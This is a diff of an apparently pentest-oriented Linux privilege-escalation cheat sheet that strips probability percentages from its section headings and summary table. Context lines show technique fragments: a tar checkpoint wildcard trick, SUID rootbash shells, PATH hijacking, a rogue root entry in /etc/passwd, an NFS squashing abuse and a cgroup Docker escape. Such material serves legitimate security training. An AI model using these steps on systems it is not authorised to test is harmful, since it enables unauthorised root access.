@@ -31,7 +31,7 @@ ps aux
 ps aux | grep root
 ```
 
-## 1. AUTOMATED ENUMERATION SCRIPTS (Wahrscheinlichkeit: 90%)
+## 1. AUTOMATED ENUMERATION SCRIPTS 
 
 ### LinPEAS (MUST-USE!):
 ```bash
@@ -59,7 +59,7 @@ chmod +x lse.sh
 ./lse.sh -l 2  # Level 2 (detailed)
 ```
 
-## 2. SUDO EXPLOITATION (Wahrscheinlichkeit: 60%)
+## 2. SUDO EXPLOITATION
 
 ### Sudo -l Check:
 ```bash
@@ -113,7 +113,7 @@ https://gtfobins.github.io/
 # Copy paste exploit!
 ```
 
-## 3. SUID BINARIES (Wahrscheinlichkeit: 70%)
+## 3. SUID BINARIES
 
 ### Find SUID Files:
 ```bash
@@ -168,7 +168,7 @@ export PATH=/tmp:$PATH
 /path/to/vulnerable_binary
 ```
 
-## 4. CRONJOBS (Wahrscheinlichkeit: 40%)
+## 4. CRONJOBS
 
 ### Cron Enumeration:
 ```bash
@@ -206,7 +206,7 @@ touch /tmp/--checkpoint-action=exec=sh\\ shell.sh
 /tmp/rootbash -p
 ```
 
-## 5. CAPABILITIES (Wahrscheinlichkeit: 25%)
+## 5. CAPABILITIES 
 
 ### Find Capabilities:
 ```bash
@@ -229,7 +229,7 @@ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
 /binary /etc/shadow
 ```
 
-## 6. KERNEL EXPLOITS (Wahrscheinlichkeit: 30% - LETZTER AUSWEG!)
+## 6. KERNEL EXPLOITS
 
 ### Kernel Version:
 ```bash
@@ -273,7 +273,7 @@ chmod +x linux-exploit-suggester.sh
 ./linux-exploit-suggester.sh
 ```
 
-## 7. PASSWORDS & CREDENTIALS (Wahrscheinlichkeit: 50%)
+## 7. PASSWORDS & CREDENTIALS
 
 ### History Files:
 ```bash
@@ -319,7 +319,7 @@ ssh username@localhost
 mysql -u root -p
 ```
 
-## 8. WRITABLE /etc/passwd (Wahrscheinlichkeit: 15%)
+## 8. WRITABLE /etc/passwd 
 
 ```bash
 # Check if writable
@@ -337,7 +337,7 @@ su root2
 # Password: password123
 ```
 
-## 9. NFS ROOT SQUASHING (Wahrscheinlichkeit: 10%)
+## 9. NFS ROOT SQUASHING 
 
 ### Victim Enumeration:
 ```bash
@@ -361,7 +361,7 @@ chmod +s /tmp/nfs/rootbash
 /share/rootbash -p
 ```
 
-## 10. DOCKER ESCAPE (Wahrscheinlichkeit: 20% - wenn in Container)
+## 10. DOCKER ESCAPE 
 
 ### Check if in Docker:
 ```bash
@@ -424,16 +424,16 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ## 12. WAHRSCHEINLICHKEITEN NACH VEKTOR
 
 ```
-LinPEAS Auto-Find:     90%
-Sudo -l:               60%
-SUID Binaries:         70%
-Passwords/Creds:       50%
-Cronjobs:              40%
-Kernel Exploits:       30%
-Capabilities:          25%
-Docker Escape:         20%
-/etc/passwd writable:  15%
-NFS root_squash:       10%
+LinPEAS Auto-Find:     
+Sudo -l:               
+SUID Binaries:        
+Passwords/Creds:       
+Cronjobs:              
+Kernel Exploits:       
+Capabilities:          
+Docker Escape:         
+/etc/passwd writable:  
+NFS root_squash:       
 ```
 
 ## 13. GOLDEN RULES LINUX PRIVESC
